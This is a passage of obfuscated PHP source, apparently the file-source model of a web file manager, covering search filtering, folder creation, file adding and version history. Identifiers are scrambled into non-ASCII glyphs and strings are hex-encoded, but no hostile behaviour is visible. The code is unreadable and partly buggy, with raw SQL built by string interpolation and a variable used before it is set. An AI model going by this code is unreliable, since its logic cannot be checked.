} $ïÒ”©≥Ë = array(); foreach ($´Ï⁄πãê as $‡®ºùæ) { if ($this->_listSearchFilter($‡®ºùæ, $ÿÀ‡Àƒ˚)) { $ïÒ”©≥Ë[] = $‡®ºùæ; } } $∞ô˛·∫∂[$ä…„«ú·[378]] = array_merge($ïÒ”©≥Ë, $∞ô˛·∫∂[$ä…„«ú·[378]]); $∞ô˛·∫∂[$ä…„«ú·[375]][$ä…„«ú·[376]] += count($ïÒ”©≥Ë); } private function _listSearchFilter($‘†õÑª, $‹ºÏ˛õÚ) { $∆›ÌúÖ =& $_SERVER[Á≈ ä ∞]; $™É¿ÍÂÂ = $‘†õÑª[$∆›ÌúÖ[419]] == $∆›ÌúÖ[98]; if (!strstr($‘†õÑª[$∆›ÌúÖ[530]], $∆›ÌúÖ[60] . $‹ºÏ˛õÚ[$∆›ÌúÖ[441]] . $∆›ÌúÖ[60])) { return !1; } if (isset($‹ºÏ˛õÚ[$∆›ÌúÖ[421]]) && $‹ºÏ˛õÚ[$∆›ÌúÖ[421]] != $∆›ÌúÖ[1885]) { if ($‹ºÏ˛õÚ[$∆›ÌúÖ[421]] == $∆›ÌúÖ[85] && !$™É¿ÍÂÂ) { return !1; } if ($‹ºÏ˛õÚ[$∆›ÌúÖ[421]] != $∆›ÌúÖ[85] && $™É¿ÍÂÂ) { return !1; } if (!strstr($‘†õÑª[$∆›ÌúÖ[184]], $∆›ÌúÖ[60] . $‹ºÏ˛õÚ[$∆›ÌúÖ[421]] . $∆›ÌúÖ[60])) { return !1; } } if (isset($‹ºÏ˛õÚ[$∆›ÌúÖ[2087]]) && $‹ºÏ˛õÚ[$∆›ÌúÖ[2087]] < $‘†õÑª[$∆›ÌúÖ[86]]) { return !1; } if (isset($‹ºÏ˛õÚ[$∆›ÌúÖ[2088]]) && $‹ºÏ˛õÚ[$∆›ÌúÖ[2088]] > $‘†õÑª[$∆›ÌúÖ[86]]) { return !1; } if (isset($‹ºÏ˛õÚ[$∆›ÌúÖ[609]]) && $‹ºÏ˛õÚ[$∆›ÌúÖ[609]] != $‘†õÑª[$∆›ÌúÖ[465]]) { return !1; } return !0; } public function listSearchChildren($Å™¥µ∆ª, $‚÷†õˆÒ = 5000) { $„îÊîÈ„ =& $_SERVER[Á≈ ä ∞]; $“Ç´ï¡¶ = array(); $ÂÑ»˙¸ì = $this->sourceInfo($Å™¥µ∆ª); $ÆÖ´à«í = array($„îÊîÈ„[530] => array($„îÊîÈ„[392], $ÂÑ»˙¸ì[$„îÊîÈ„[530]] . $ÂÑ»˙¸ì[$„îÊîÈ„[411]] . $„îÊîÈ„[560])); $æòﬁúîú = $this->field($„îÊîÈ„[86])->where($ÆÖ´à«í)->limit($‚÷†õˆÒ + 1)->select(); $ÊÏÚàø∂ = is_array($æòﬁúîú) ? count($æòﬁúîú) : 0; if ($ÊÏÚàø∂ > $‚÷†õˆÒ) { return $this->_listSearchChildrenNear($Å™¥µ∆ª, $‚÷†õˆÒ); } $√˝ó≈¥Œ = $this->field($„îÊîÈ„[411])->where($ÆÖ´à«í)->select(); $“Ç´ï¡¶ = array_to_keyvalue($√˝ó≈¥Œ, $„îÊîÈ„[22], $„îÊîÈ„[411]); return $“Ç´ï¡¶; } private function _listSearchChildrenNear($Æ˛Æ›˝´, $ƒÏ˝˜î†) { $∫ë«ÀìÓ =& $_SERVER[Á≈ ä ∞]; $“ÂœÓû¸ = array(); $™≠»Ω∆“ = array($∫ë«ÀìÓ[441] => $Æ˛Æ›˝´); $∑’á–”» = $this->field($∫ë«ÀìÓ[2089])->where($™≠»Ω∆“)->select(); $çœ˛÷‰ƒ = array_to_keyvalue(array_filter_by_field($∑’á–”», $∫ë«ÀìÓ[419], $∫ë«ÀìÓ[98]), $∫ë«ÀìÓ[22], $∫ë«ÀìÓ[411]); $“ÂœÓû¸ = array_merge($“ÂœÓû¸, array_to_keyvalue($∑’á–”», $∫ë«ÀìÓ[22], $∫ë«ÀìÓ[411])); if (!$çœ˛÷‰ƒ) { return $“ÂœÓû¸; } $™≠»Ω∆“ = array($∫ë«ÀìÓ[441] => array($∫ë«ÀìÓ[17], $çœ˛÷‰ƒ)); $∑’á–”» = $this->field($∫ë«ÀìÓ[2089])->where($™≠»Ω∆“)->limit($ƒÏ˝˜î†)->select(); $“ÂœÓû¸ = array_merge($“ÂœÓû¸, array_to_keyvalue($∑’á–”», $∫ë«ÀìÓ[22], $∫ë«ÀìÓ[411])); $“ÂœÓû¸ = array_slice($“ÂœÓû¸, 0, $ƒÏ˝˜î†); return $“ÂœÓû¸; } private function _listSearchBindPinyin($Æ£Çﬂ‚û, &$îÂÖÉ≈˝, &$Ñ«àı»Ê) { $ÀÜ›≈–™ =& $_SERVER[Á≈ ä ∞]; if (!isset($Æ£Çﬂ‚û[$ÀÜ›≈–™[1924]]) || !$Æ£Çﬂ‚û[$ÀÜ›≈–™[1924]]) { return; } if (!Input::check($Æ£Çﬂ‚û[$ÀÜ›≈–™[1924]], $ÀÜ›≈–™[327]) || strlen($Æ£Çﬂ‚û[$ÀÜ›≈–™[1924]]) < 2) { return; } $˚‚·∞∏ü = "\x4c\x45\x46\x54\x20\x4a\117\x49\116\40{$this->tablePrefix}\151\157\137\x73\157\x75\162\x63\x65\x5f\x6d\145\164\x61\x20\x6d\145\164\x61\x20\157\156\40\x73\157\x75\x72\x63\145\x2e\163\x6f\165\x72\x63\145\111\x44\40\75\40\x6d\x65\x74\x61\56\x73\x6f\x75\x72\x63\145\x49\x44"; $ﬂœã∞ıÚ = array(); $Ñ«àı»Ê = str_replace(array($ÀÜ›≈–™[11], $ÀÜ›≈–™[63], $ÀÜ›≈–™[2090]), $ÀÜ›≈–™[22], $Ñ«àı»Ê); $Ñ«àı»Ê = $ÀÜ›≈–™[447] . str_replace($ÀÜ›≈–™[60], $ÀÜ›≈–™[448], $Ñ«àı»Ê); $ÌØÿ…Ìª = $îÂÖÉ≈˝[$ÀÜ›≈–™[42]]; unset($îÂÖÉ≈˝[$ÀÜ›≈–™[42]]); foreach ($îÂÖÉ≈˝ as $≥Í“ËÓö => $¯ù∂‘€È) { $ﬂœã∞ıÚ[$ÀÜ›≈–™[447] . $≥Í“ËÓö] = $¯ù∂‘€È; } foreach ($ÌØÿ…Ìª as $«Ä¡Á) { $ﬂœã∞ıÚ[] = array($ÀÜ›≈–™[452] => $«Ä¡Á, $ÀÜ›≈–™[1003] => $ÀÜ›≈–™[1928], array($ÀÜ›≈–™[2091] => $«Ä¡Á, $ÀÜ›≈–™[2092] => array($ÀÜ›≈–™[17], array($ÀÜ›≈–™[474], $ÀÜ›≈–™[473])))); } $this->join($˚‚·∞∏ü); $îÂÖÉ≈˝ = $ﬂœã∞ıÚ; } private function _parseSearchWhere($›º¶¸«è) { $§™ÊäïÅ =& $_SERVER[Á≈ ä ∞]; $∑ûñ∫î£ = array(); if (isset($›º¶¸«è[$§™ÊäïÅ[768]]) && $›º¶¸«è[$§™ÊäïÅ[768]]) { $∑ûñ∫î£[$§™ÊäïÅ[95]] = array($§™ÊäïÅ[2093], $›º¶¸«è[$§™ÊäïÅ[768]]); } if (isset($›º¶¸«è[$§™ÊäïÅ[506]]) && $›º¶¸«è[$§™ÊäïÅ[506]]) { $ñô∂ˆ—§ = array($§™ÊäïÅ[2094], $›º¶¸«è[$§™ÊäïÅ[506]]); if ($∑ûñ∫î£[$§™ÊäïÅ[95]]) { $∑ûñ∫î£[$§™ÊäïÅ[95]] = array($∑ûñ∫î£[$§™ÊäïÅ[95]], $ñô∂ˆ—§, $§™ÊäïÅ[2095]); } else { $∑ûñ∫î£[$§™ÊäïÅ[95]] = $ñô∂ˆ—§; } } if (isset($›º¶¸«è[$§™ÊäïÅ[2087]]) && $›º¶¸«è[$§™ÊäïÅ[2087]] > 0) { $∑ûñ∫î£[$§™ÊäïÅ[86]] = array($§™ÊäïÅ[2093], $›º¶¸«è[$§™ÊäïÅ[2087]]); } if (isset($›º¶¸«è[$§™ÊäïÅ[2088]]) && $›º¶¸«è[$§™ÊäïÅ[2088]]) { $ñô∂ˆ—§ = array($§™ÊäïÅ[2094], $›º¶¸«è[$§™ÊäïÅ[2088]]); if ($∑ûñ∫î£[$§™ÊäïÅ[86]]) { $∑ûñ∫î£[$§™ÊäïÅ[86]] = array($∑ûñ∫î£[$§™ÊäïÅ[86]], $ñô∂ˆ—§, $§™ÊäïÅ[2095]); } else { $∑ûñ∫î£[$§™ÊäïÅ[86]] = $ñô∂ˆ—§; } } if (isset($›º¶¸«è[$§™ÊäïÅ[609]]) && $›º¶¸«è[$§™ÊäïÅ[609]]) { $∑ûñ∫î£[] = array($§™ÊäïÅ[465] => $›º¶¸«è[$§™ÊäïÅ[609]], $§™ÊäïÅ[463] => $›º¶¸«è[$§™ÊäïÅ[609]], $§™ÊäïÅ[1003] => $§™ÊäïÅ[1928]); } if (isset($›º¶¸«è[$§™ÊäïÅ[421]]) && $›º¶¸«è[$§™ÊäïÅ[421]]) { $‰ﬁ‰ê’Ë = $›º¶¸«è[$§™ÊäïÅ[421]]; if ($‰ﬁ‰ê’Ë == $§™ÊäïÅ[85]) { $∑ûñ∫î£[$§™ÊäïÅ[419]] = 1; } else { if ($‰ﬁ‰ê’Ë == $§™ÊäïÅ[2096]) { $∑ûñ∫î£[$§™ÊäïÅ[419]] = 0; } else { if ($‰ﬁ‰ê’Ë) { $‰ﬁ‰ê’Ë = is_array($‰ﬁ‰ê’Ë) ? $‰ﬁ‰ê’Ë : explode($§™ÊäïÅ[60], $‰ﬁ‰ê’Ë); $∑ûñ∫î£[$§™ÊäïÅ[421]] = array($§™ÊäïÅ[427], $‰ﬁ‰ê’Ë); $∑ûñ∫î£[$§™ÊäïÅ[419]] = 0; } } } } $this->_parseSearchParent($›º¶¸«è, $∑ûñ∫î£); if (isset($›º¶¸«è[$§™ÊäïÅ[1924]]) && trim($›º¶¸«è[$§™ÊäïÅ[1924]])) { $áœ€ö‡∆ = trim($›º¶¸«è[$§™ÊäïÅ[1924]]); $é¬¯ç—À = explode($§™ÊäïÅ[63], $áœ€ö‡∆); if (strlen($áœ€ö‡∆) > 2 && (substr($áœ€ö‡∆, 0, 1) == $§™ÊäïÅ[128] && substr($áœ€ö‡∆, -1) == $§™ÊäïÅ[128]) || substr($áœ€ö‡∆, 0, 1) == $§™ÊäïÅ[68] && substr($áœ€ö‡∆, -1) == $§™ÊäïÅ[68]) { $áœ€ö‡∆ = substr($áœ€ö‡∆, 1, -1); $é¬¯ç—À = array($áœ€ö‡∆); } $∑ûñ∫î£[$§™ÊäïÅ[42]] = array(array($§™ÊäïÅ[559], $§™ÊäïÅ[1926] . $áœ€ö‡∆ . $§™ÊäïÅ[1926])); if (count($é¬¯ç—À) > 1) { $∑ûñ∫î£[$§™ÊäïÅ[42]] = array(); foreach ($é¬¯ç—À as $ì™“¥¡¢) { if (!trim($ì™“¥¡¢)) { continue; } $∑ûñ∫î£[$§™ÊäïÅ[42]][] = array($§™ÊäïÅ[559], $§™ÊäïÅ[1926] . trim($ì™“¥¡¢) . $§™ÊäïÅ[1926]); } } } return $∑ûñ∫î£; } private function _parseSearchParent($¯ „Êè¸, &$«ñ—¬¡∆) { $˜Üãê≈≠ =& $_SERVER[Á≈ ä ∞]; if (!isset($¯ „Êè¸[$˜Üãê≈≠[441]]) || !$¯ „Êè¸[$˜Üãê≈≠[441]]) { return; } $˙É¢≠àá = $this->pathInfo($¯ „Êè¸[$˜Üãê≈≠[441]]); $ÈÍÁ€÷« = $˙É¢≠àá[$˜Üãê≈≠[441]] . $˜Üãê≈≠[22] === $˜Üãê≈≠[207]; $’Óë‰®ß = $˙É¢≠àá[$˜Üãê≈≠[420]] == $˜Üãê≈≠[524]; if ($˙É¢≠àá[$˜Üãê≈≠[541]] == $˜Üãê≈≠[542]) { $ÛÉ”è·™ = $this->sourceInfo($¯ „Êè¸[$˜Üãê≈≠[441]]); $˙É¢≠àá[$˜Üãê≈≠[530]] = $ÛÉ”è·™[$˜Üãê≈≠[530]]; } $«ñ—¬¡∆[$˜Üãê≈≠[599]] = array($˜Üãê≈≠[559], $˙É¢≠àá[$˜Üãê≈≠[530]] . $¯ „Êè¸[$˜Üãê≈≠[441]] . $˜Üãê≈≠[560]); $ñ⁄îöÏ¡ = isset($¯ „Êè¸[$˜Üãê≈≠[1789]]) && in_array($˜Üãê≈≠[524], $¯ „Êè¸[$˜Üãê≈≠[1789]]); if (!$ñ⁄îöÏ¡ || !$’Óë‰®ß || !$ÈÍÁ€÷« || !$˙É¢≠àá[$˜Üãê≈≠[422]]) { return; } if (!AuthModel::authCheckRoot($˙É¢≠àá[$˜Üãê≈≠[422]][$˜Üãê≈≠[423]])) { return; } $◊Ò√‡Ë∏ = $˙É¢≠àá[$˜Üãê≈≠[514]] . $˜Üãê≈≠[22]; if ($◊Ò√‡Ë∏ == $˜Üãê≈≠[98]) { unset($«ñ—¬¡∆[$˜Üãê≈≠[599]]); $«ñ—¬¡∆[$˜Üãê≈≠[420]] = self::TYPE_GROUP; return; } $Áõô’åÏ = Model($˜Üãê≈≠[531])->groupChildrenAll($◊Ò√‡Ë∏); $éõŸÑ’Ò = count($Áõô’åÏ); if ($éõŸÑ’Ò <= 1) { return; } $ä≥Ü÷Ï⁄ = array($˜Üãê≈≠[441] => 0, $˜Üãê≈≠[420] => self::TYPE_GROUP, $˜Üãê≈≠[514] => array($˜Üãê≈≠[17], $Áõô’åÏ)); $ÀΩÌÏüë = $this->field($˜Üãê≈≠[2097])->where($ä≥Ü÷Ï⁄)->limit($éõŸÑ’Ò)->select(); $«ñ—¬¡∆[$˜Üãê≈≠[599]] = array(); foreach ($ÀΩÌÏüë as $æ†‚ËûÂ) { $«ñ—¬¡∆[$˜Üãê≈≠[599]][] = array($˜Üãê≈≠[559], $˜Üãê≈≠[540] . $æ†‚ËûÂ[$˜Üãê≈≠[411]] . $˜Üãê≈≠[560]); } $«ñ—¬¡∆[$˜Üãê≈≠[599]][] = $˜Üãê≈≠[1928]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ŸöüäûÌ) { $·¿Î˘˜ô =& $_SERVER[Á≈ ä ∞]; $ﬂû¯¬èΩ = Model($·¿Î˘˜ô[522])->where(array($·¿Î˘˜ô[1649] => $ŸöüäûÌ))->find(); $—óÚñùµ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ŸöüäûÌ, $ﬂû¯¬èΩ[$·¿Î˘˜ô[42]]); $this->userDesktopAdd($—óÚñùµ); return $—óÚñùµ; } public function userDesktopAdd($©ƒã´≥Ô) { $ìû¸ñÚ =& $_SERVER[Á≈ ä ∞]; $’“Ê¥¿∆ = LNG($ìû¸ñÚ[2098]); $Ñ√óÿıí = $this->mkdir($©ƒã´≥Ô, $’“Ê¥¿∆); $this->metaSet($Ñ√óÿıí, $ìû¸ñÚ[2099], $ìû¸ñÚ[98]); $this->metaSet($©ƒã´≥Ô, $ìû¸ñÚ[2100], $Ñ√óÿıí); } public function userPathSafeAdd($Öã—Ç—≠) { $„Ÿâ©æÊ =& $_SERVER[Á≈ ä ∞]; $ÿå⁄£úº = Model($„Ÿâ©æÊ[522])->getInfoFull($Öã—Ç—≠); if (!$ÿå⁄£úº) { return !1; } if (_get($ÿå⁄£úº, $„Ÿâ©æÊ[545])) { return $ÿå⁄£úº[$„Ÿâ©æÊ[475]][$„Ÿâ©æÊ[2101]]; } $–Ω˜òﬁ® = $this->_mkdirRoot(SourceModel::TYPE_USER, $Öã—Ç—≠, $„Ÿâ©æÊ[2102], $„Ÿâ©æÊ[442]); Model($„Ÿâ©æÊ[522])->metaSet($Öã—Ç—≠, $„Ÿâ©æÊ[2101], $–Ω˜òﬁ®); $this->metaSet($–Ω˜òﬁ®, $„Ÿâ©æÊ[2103], $Öã—Ç—≠); return $–Ω˜òﬁ®; } public function groupRootAdd($∆ÈéœÕÔ) { $îÅÇÇÉî =& $_SERVER[Á≈ ä ∞]; $É¡ÇÛ¯ß = Model($îÅÇÇÉî[531])->where(array($îÅÇÇÉî[1918] => $∆ÈéœÕÔ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $∆ÈéœÕÔ, $É¡ÇÛ¯ß[$îÅÇÇÉî[42]]); } public function systemRootPathAdd($ﬁ⁄Ó”ÉÅ) { if ($ﬁ⁄Ó”ÉÅ != $_SERVER[Á≈ ä ∞][553]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ﬁ⁄Ó”ÉÅ); } public function userRootRemove($’Ù¨„˛Ç) { $Ãÿ¡åÍå = $this->sourceRoot(SourceModel::TYPE_USER, $’Ù¨„˛Ç, !0); foreach ($Ãÿ¡åÍå as $âëîåÙ¿) { if (!$âëîåÙ¿) { continue; } $this->remove($âëîåÙ¿[$_SERVER[Á≈ ä ∞][411]], !1); } } public function groupRootRemove($Ï°¬˘Î∞) { $î¥áÙëØ = $this->sourceRoot(SourceModel::TYPE_GROUP, $Ï°¬˘Î∞); if (!$î¥áÙëØ) { return; } $this->remove($î¥áÙëØ[$_SERVER[Á≈ ä ∞][411]], !1); } private function _mkdirRoot($ó¶É“∏ù, $è‡˙áˆ, $êÄ‘∆÷…, $è¥ß´⁄Ó = '') { $“∏é¿◊∂ =& $_SERVER[Á≈ ä ∞]; $ò‘˙º’ÿ = array($“∏é¿◊∂[410] => 0, $“∏é¿◊∂[595] => $ó¶É“∏ù, $“∏é¿◊∂[596] => $è‡˙áˆ, $“∏é¿◊∂[592] => 1, $“∏é¿◊∂[597] => USER_ID, $“∏é¿◊∂[598] => USER_ID, $“∏é¿◊∂[593] => $è¥ß´⁄Ó, $“∏é¿◊∂[599] => $“∏é¿◊∂[540], $“∏é¿◊∂[439] => 0, $“∏é¿◊∂[594] => 0, $“∏é¿◊∂[478] => 0, $“∏é¿◊∂[600] => $“∏é¿◊∂[22]); if ($Ã˚¥≥öÉ = $this->where($ò‘˙º’ÿ)->find()) { return $Ã˚¥≥öÉ[$“∏é¿◊∂[411]]; } $ﬁÙÒÜä´ = "\x4d\x6f\144\145\154\x53\157\x75\x72\x63\x65\x2e\155\153\x64\x69\x72\x52\157\x6f\x74\56{$ó¶É“∏ù}\56{$è‡˙áˆ}\56" . $êÄ‘∆÷…; CacheLock::lock($ﬁÙÒÜä´); $ò‘˙º’ÿ[$“∏é¿◊∂[42]] = $êÄ‘∆÷…; $ë¶≥‚Îâ = $this->add($ò‘˙º’ÿ); $ñ˝¿ãÇ = array($“∏é¿◊∂[601] => short_id($ë¶≥‚Îâ)); $this->where(array($“∏é¿◊∂[426] => $ë¶≥‚Îâ))->save($ñ˝¿ãÇ); CacheLock::unlock($ﬁÙÒÜä´); return $ë¶≥‚Îâ; } private function sourceRoot($√‘÷€õØ, $Å¥∫É§ø, $∏—ûêÖã = false) { $œ÷îñ¸¨ =& $_SERVER[Á≈ ä ∞]; $¨‰Áµ˜Õ = array($œ÷îñ¸¨[410] => 0, $œ÷îñ¸¨[595] => $√‘÷€õØ, $œ÷îñ¸¨[596] => $Å¥∫É§ø); if ($∏—ûêÖã) { $‘∫™∂ÙÉ = $this->where($¨‰Áµ˜Õ)->select(); return $‘∫™∂ÙÉ ? $‘∫™∂ÙÉ : array(); } $ÅÒÎÃÖÓ = $this->where($¨‰Áµ˜Õ)->find(); return $ÅÒÎÃÖÓ ? $ÅÒÎÃÖÓ : array(); } public function sourceRootGroup($í±»î»Ú) { $è´ÕáÆ‡ =& $_SERVER[Á≈ ä ∞]; if (is_string($í±»î»Ú)) { $í±»î»Ú = array($í±»î»Ú); } $Æ—´ñ≠È = $this->listSourceRoot(SourceModel::TYPE_GROUP, $í±»î»Ú, $è´ÕáÆ‡[198]); $™≤÷çÖ‚ = array($è´ÕáÆ‡[378] => $Æ—´ñ≠È, $è´ÕáÆ‡[375] => array($è´ÕáÆ‡[766] => count($í±»î»Ú))); $this->_listDataApply($™≤÷çÖ‚[$è´ÕáÆ‡[378]]); $this->_listMake($™≤÷çÖ‚); return array_to_keyvalue($™≤÷çÖ‚[$è´ÕáÆ‡[92]], $è´ÕáÆ‡[514]); } public function mkfile($¨—˙Âá‡, $ß∑ê˜√∞, $·îÛëﬁ∆ = '', $ƒ¿‡®ã® = REPEAT_RENAME) { $¥ÃãÃ¿≈ =& $_SERVER[Á≈ ä ∞]; $÷ØÙ˝»Ë = Model($¥ÃãÃ¿≈[618])->addFileByContent($·îÛëﬁ∆, $ß∑ê˜√∞); return $this->_createFileCall($¨—˙Âá‡, $ß∑ê˜√∞, $÷ØÙ˝»Ë, $ƒ¿‡®ã®, $¥ÃãÃ¿≈[1341]); } public function addFile($òˆŒ«±”, $£©˘≤©à, $Îßœãë˘, $ ´Î—¯¯ = false, $≤Û≤õö‡ = REPEAT_RENAME) { $Õ˛‹ç˛î = Model($_SERVER[Á≈ ä ∞][618])->addFile($£©˘≤©à, $Îßœãë˘, $ ´Î—¯¯); return $this->_createFileCall($òˆŒ«±”, $Îßœãë˘, $Õ˛‹ç˛î, $≤Û≤õö‡); } public function addFileByFileID($∂ﬂÎöÿä, $Îê°ì©£, $ì™„Å“º, $≠Â⁄Õ ¿ = REPEAT_RENAME) { $ÄÚÒÌ¬Ë =& $_SERVER[Á≈ ä ∞]; $à‚Œåµà = Model($ÄÚÒÌ¬Ë[618])->find($Îê°ì©£); Model($ÄÚÒÌ¬Ë[618])->linkAdd($Îê°ì©£); return $this->_createFileCall($∂ﬂÎöÿä, $ì™„Å“º, $à‚Œåµà, $≠Â⁄Õ ¿); } public function addFileByRemote($ˆëÈÓë◊, $˙èŒ∞∆Õ, $¿‰⁄ç“Ï, $çõΩá£‘ = array(), $ÄûçÉƒº = REPEAT_RENAME) { $Ï∫ò¯·€ = Model($_SERVER[Á≈ ä ∞][618])->addFileByRemote($˙èŒ∞∆Õ, $¿‰⁄ç“Ï, $çõΩá£‘); return $this->_createFileCall($ˆëÈÓë◊, $¿‰⁄ç“Ï, $Ï∫ò¯·€, $ÄûçÉƒº); } private function _createFileCall($¬ﬁ‚Ä≤û, $õ‚¢ÜÊÄ, $¡†Â§“è, $äπùﬂ¸π, $˝±Ω¶å› = "\x75\x70\x6c\x6f\141\x64") { $∏≥˜„‹Â =& $_SERVER[Á≈ ä ∞]; $çÊéËæ· = !1; $this->setMasterDB(); $this->lockWriteStart($¬ﬁ‚Ä≤û, $õ‚¢ÜÊÄ); $√“ƒº‹Ï = $this->fileNameExist($¬ﬁ‚Ä≤û, $õ‚¢ÜÊÄ); $Û⁄¡…¬Ú = $this->_createFile($¬ﬁ‚Ä≤û, $õ‚¢ÜÊÄ, $¡†Â§“è, $äπùﬂ¸π, $çÊéËæ·); if (!$çÊéËæ·) { Model($∏≥˜„‹Â[480])->remove($¡†Â§“è[$∏≥˜„‹Â[477]]); } if ($çÊéËæ· && $Û⁄¡…¬Ú && $Û⁄¡…¬Ú != $√“ƒº‹Ï) { Model($∏≥˜„‹Â[2071])->eventCreate($Û⁄¡…¬Ú, $˝±Ω¶å›); } $this->lockWriteEnd($¬ﬁ‚Ä≤û, $õ‚¢ÜÊÄ); return $Û⁄¡…¬Ú; } public function mkdir($ûïãÎ«€, $⁄ÍñüÿÆ, $πÔÏò”º = REPEAT_SKIP) { $Œ˚àáõú =& $_SERVER[Á≈ ä ∞]; $this->setMasterDB(); $íè‹üä√ = $this->sourceInfo($ûïãÎ«€); if (!$íè‹üä√) { return !1; } $this->lockWriteStart($ûïãÎ«€, $⁄ÍñüÿÆ); if ($πÔÏò”º !== !1) { $¥—ö›”Á = $this->fileNameExist($ûïãÎ«€, $⁄ÍñüÿÆ); if ($¥—ö›”Á && $πÔÏò”º != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($ûïãÎ«€, $⁄ÍñüÿÆ); return $¥—ö›”Á; } $⁄ÍñüÿÆ = $this->fileNameAuto($ûïãÎ«€, $⁄ÍñüÿÆ, $πÔÏò”º); } $ÚÌ“≤¥Ø = array($Œ˚àáõú[592] => 1, $Œ˚àáõú[429] => $⁄ÍñüÿÆ, $Œ˚àáõú[593] => $Œ˚àáõú[22], $Œ˚àáõú[478] => 0, $Œ˚àáõú[594] => 0); $ÅáÅ∆èÉ = $this->_addSource($ÚÌ“≤¥Ø, $íè‹üä√); Model($Œ˚àáõú[2071])->eventCreate($ÅáÅ∆èÉ, $Œ˚àáõú[1342]); $this->lockWriteEnd($ûïãÎ«€, $⁄ÍñüÿÆ); return $ÅáÅ∆èÉ; } public function listSourceRoot($±˛∂ó˚‘, $˙ç»Í™Õ, $¨ää˜ü• = "\163\x6f\165\162\x63\x65\x49\x44\x2c\x74\x61\x72\147\x65\x74\x49\x44\x2c\x73\x69\x7a\x65") { $ÛÊÜ∑» =& $_SERVER[Á≈ ä ∞]; $‚ÂåéÂ€ = $ÛÊÜ∑»[387]; $€ú˙®ÿù = array(); $Ñ¸ØÁ˝⁄ = 1024 * 50; $õ«∂©äŒ = is_array($õ«∂©äŒ) ? $õ«∂©äŒ : array(); $ûÑ—Ωº = count($˙ç»Í™Õ); $ÔÃÔ—®ı = $this->tablePrefix . $ÛÊÜ∑»[2104]; for ($≠”∏° Ñ = 0; $≠”∏° Ñ < $ûÑ—Ωº; $≠”∏° Ñ++) { $ˆ˝—˙∏” = $˙ç»Í™Õ[$≠”∏° Ñ]; $‚ÂåéÂ€ .= "\x53\x45\114\105\103\124\x20\x2a\40\106\x52\x4f\x4d\x20\x28\x53\105\114\x45\x43\x54\x20{$¨ää˜ü•}\x20\x46\x52\x4f\x4d\x20\140{$ÔÃÔ—®ı}\140\40\x57\x48\x45\122\x45\x20"; $‚ÂåéÂ€ .= "\x60\x70\141\x72\x65\156\x74\x49\104\140\75\60\x20\x41\116\104\x20\140\164\x61\x72\147\145\164\111\104\140\75{$ˆ˝—˙∏”}\40\101\116\104\x20\140\x74\x61\162\147\x65\164\x54\x79\160\145\140\x3d{$±˛∂ó˚‘}\x20\x6c\x69\x6d\x69\x74\40\x31\x29\40\x61\x73\x20\x74\142\137{$≠”∏° Ñ}\40\125\116\111\x4f\116\40\101\114\114\40"; if ((strlen($‚ÂåéÂ€) >= $Ñ¸ØÁ˝⁄ || $≠”∏° Ñ == $ûÑ—Ωº - 1) && $‚ÂåéÂ€) { $‚ÂåéÂ€ = substr($‚ÂåéÂ€, 0, -strlen($ÛÊÜ∑»[1041])); $Üû–”ıæ = $this->query($‚ÂåéÂ€); $‚ÂåéÂ€ = $ÛÊÜ∑»[22]; $€ú˙®ÿù = array_merge($€ú˙®ÿù, $Üû–”ıæ); } } return $€ú˙®ÿù; } private function _createFile($ëú§ Ôß, $¨’¸˝‹Ê, $⁄÷Ñ◊∫ª, $óÿ‚Æ„, &$ËÜ‰‰†è) { $Ûö‘â±ê =& $_SERVER[Á≈ ä ∞]; $ÏÄ‹ñÓï = $this->sourceInfo($ëú§ Ôß); if (!$⁄÷Ñ◊∫ª || !$ÏÄ‹ñÓï) { return !1; } if ($óÿ‚Æ„ !== !1) { $«è◊èΩ› = $this->fileNameExist($ëú§ Ôß, $¨’¸˝‹Ê); } $ËÜ‰‰†è = !0; if ($óÿ‚Æ„ && $«è◊èΩ›) { if ($óÿ‚Æ„ == REPEAT_SKIP) { $ËÜ‰‰†è = !1; return $«è◊èΩ›; } else { if ($óÿ‚Æ„ == REPEAT_REPLACE) { $ËñßãÖØ = $this->sourceInfo($«è◊èΩ›); $ÀµÉ∫†ï = $this->fileHistory($ËñßãÖØ, $⁄÷Ñ◊∫ª[$Ûö‘â±ê[477]], $⁄÷Ñ◊∫ª[$Ûö‘â±ê[86]]); if (!$ÀµÉ∫†ï) { $ËÜ‰‰†è = !1; } else { $this->folderSizeReset($ëú§ Ôß); } return $«è◊èΩ›; } else { $¨’¸˝‹Ê = $this->fileNameAuto($ëú§ Ôß, $¨’¸˝‹Ê, $óÿ‚Æ„, !1); } } } $—ïıõ‘â = array($Ûö‘â±ê[592] => 0, $Ûö‘â±ê[429] => $¨’¸˝‹Ê, $Ûö‘â±ê[593] => substr(get_path_ext($¨’¸˝‹Ê), 0, 10), $Ûö‘â±ê[478] => $⁄÷Ñ◊∫ª[$Ûö‘â±ê[477]], $Ûö‘â±ê[594] => $⁄÷Ñ◊∫ª[$Ûö‘â±ê[86]]); $∑ó£É¶È = $this->_addSource($—ïıõ‘â, $ÏÄ‹ñÓï); $this->folderSizeReset($ëú§ Ôß, intval($—ïıõ‘â[$Ûö‘â±ê[86]])); return $∑ó£É¶È; } protected function fileHistory($Ä»Á¯≠œ, $ªàé„©’, $·¡∑É√ù) { $ﬁï„àÂÄ =& $_SERVER[Á≈ ä ∞]; $å•æ∑÷Ç = defined($ﬁï„àÂÄ[484]) ? USER_ID : $ﬁï„àÂÄ[207]; if ($Ä»Á¯≠œ[$ﬁï„àÂÄ[477]] == $ªàé„©’) { return !1; } $this->checkLock($Ä»Á¯≠œ[$ﬁï„àÂÄ[411]], $ªàé„©’); Model($ﬁï„àÂÄ[2105])->addHistory($Ä»Á¯≠œ); $ßñ◊∏Ñˆ = array($ﬁï„àÂÄ[598] => $å•æ∑÷Ç, $ﬁï„àÂÄ[433] => time(), $ﬁï„àÂÄ[477] => $ªàé„©’, $ﬁï„àÂÄ[86] => $·¡∑É√ù); $this->where(array($ﬁï„àÂÄ[426] => $Ä»Á¯≠œ[$ﬁï„àÂÄ[411]]))->save($ßñ◊∏Ñˆ); $this->sourceCacheClear($Ä»Á¯≠œ[$ﬁï„àÂÄ[411]]); return !0; } public function checkLock($ÓÀé†ÍÌ, $§ô¥ΩÜ¿) { $Û°æœõò =& $_SERVER[Á≈ ä ∞]; $å–î”ˆ¯ = $this->pathInfo($ÓÀé†ÍÌ); if (!$this->fileIsLock($å–î”ˆ¯, 